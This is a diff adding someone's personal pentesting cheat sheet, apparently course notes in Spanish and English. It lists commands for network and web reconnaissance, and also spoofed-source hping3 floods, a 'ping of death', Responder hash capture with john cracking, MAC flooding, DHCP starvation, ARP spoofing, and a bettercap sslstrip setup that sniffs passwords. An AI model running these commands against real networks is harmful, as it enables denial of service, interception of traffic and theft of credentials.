@@ -1,0 +1,49 @@
+telnet ip/dns port  GET / HTTP/1.0
+whatweb
+lbd ip/dns (load balancer detector)
+Banner grabbing 
+banner grabbing con netcat: 
+nc -vv dns/ip port
+telnet dns/ip port
+Uniscan for web enum
+uniscan -u url/Directorio -q
+uniscan -u url/Directorio -we
+uniscan -u url/Directorio -d
+Sx
+sx arp CIDR | tee arp.cache
+HPING3
+hping3 -A IP -p port -c count
+hping3 -8 0-100 -S IP -V Revisar bien las flags ¿? -> systat and enum of services
+hping3 --scan 0-100 -S IP
+hping3 -1  --rand-dest -I iface¿?
+hping3 IP –udp –rand-source –data 500
+hping3 -S IP
+hping3 IP –flood
+hping3 -S IP -a Spoof-IP -p port –flood
+hping3 -d 65538 -S -p port –flood IP (ping of death)
+hping3 -2 -p port –flood
+
+Unicornscan
+unicornscan IP -Iv
+ARP SCAN
+arp-scan -I eth0 -r CDIR
+snmp-check IP (bastante info -> podría ser util) Puede listar cuentas de usuarios, servicios y demás.
+snmpwalk -v1 -c piblic (passwd) IP -> también arroja bastante información.
+For superenum: first make a list of the IP targets (1 per line), then ./superenum  and the file name.
+dig ns DNS
+dig @NS DNS axfr
+dnsrecon -> ./dnsrecon.py -d DNS -z
+enum4linux  -u usuario -p passwd -n IP (Intercambiar la flag -n com -o, -U, -P, -G, -S)
+Greenbone Security Assist -> gvm-start. Scan -> task Wizard
+nikto -h https://DNS – Cgidirs all
+nikto -h https://DNS -o nikto-scan -F txt
+wpscan –api-token API –url url –pluggins-detection-aggressive –enummerate vp
+wpscan –api-token API –url url –pluggins-detection-aggressive –enummerate u
+./Responder.py -I interface (con esto se pone en modo escuchar, cuando consulten la carpeta compartida se obtendrá la información). En el log se guarda un archivo en el que se queda un hash, con john se puede intentar crackear. Con john archivo.txt.
+sudo skipfish -o nombre_archivo -S diccionario (skipfish tiene uno llamado complete.wl) URL
+Sniffing
+macof -i iface -n 10 -> MAC flooding.
+DHCP starvation: yersinia -I (interactive) -> h (help) -> q (exit) ->  F2 DHCP Mode -> x (list of attacks) -> 1 for DHCP starvation.
+ARP Spoofing: Se ejecuta en 2 terminales en una arpspoof -I iface -t AP-IP target-IP y en la otra se intercambian las IP arpspoof -I iface -t target-IP AP-IP
+Macchanger: ifconfig iface down -> macchanger -s iface (show current config) -> macchanger -a iface -> ifconfig iface up
+bettercap -iface IFACE -> net.recon on -> set http.proxy.sslstrip true -> set arp.spoof.internal true -> set arp.spoof.targets IP -> http.proxy on -> net.sniff on -> set net.sniff.regexp ‘.*password=.*’
